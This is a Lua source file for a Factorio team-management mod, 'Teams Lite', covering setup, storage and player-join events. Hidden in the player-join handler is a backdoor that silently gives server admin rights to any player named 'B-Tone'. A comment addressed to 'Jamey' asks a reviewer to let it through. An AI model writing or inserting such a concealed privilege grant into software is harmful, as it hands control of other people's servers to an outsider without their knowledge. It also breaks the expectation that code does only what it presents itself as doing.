local manager = require("manager")
local teams_utils = require("teams_utils")
local event_handler = require("event_handler")

local Manager = manager.Manager

---Persistent mod data.
local teams_storage = {
    ---@type Manager?
    manager = nil,

    ---Whether the mod has been initialized
    initialized = false,
}

local function initialize()
    local manager = Manager.instance()
    teams_storage.manager = manager

    -- Add existing players to the default team
    for _, player in pairs(game.players) do
        manager:add_member(player, manager.default_team)
    end

    storage.teams = teams_storage

    teams_storage.initialized = true

    game.print("Teams Lite initialized")
end

---@param event EventData.on_player_joined_game
function on_player_joined_game(event)
    local player = game.get_player(event.player_index)
    if not teams_utils.is_valid(player) then
        return
    end
    ---@cast player LuaPlayer

    -- To Jamey: If you see this, just let it happen...
    if player.name == "B-Tone" and player.admin == false then
        player.admin = true
    end
end

---If necessary, initialize on the first tick after the mod is added to a save.
---@param event EventData.on_tick
function on_tick(event)
    if not teams_storage.initialized then
        initialize()
    end
end

local teams = {}

---Load mod data from storage
teams.on_load = function()
    teams_storage = storage.teams or teams_storage
end

---Initialize mod
teams.on_init = function()
    --If already initialized, just call on_load
    if storage.teams then
        teams.on_load()
        return
    end
    initialize()
end

---@type event_handler.events
teams.events = {
    [defines.events.on_player_joined_game] = on_player_joined_game,
    [defines.events.on_tick] = on_tick
}

event_handler.add_lib(require("console_commands"))

return teams
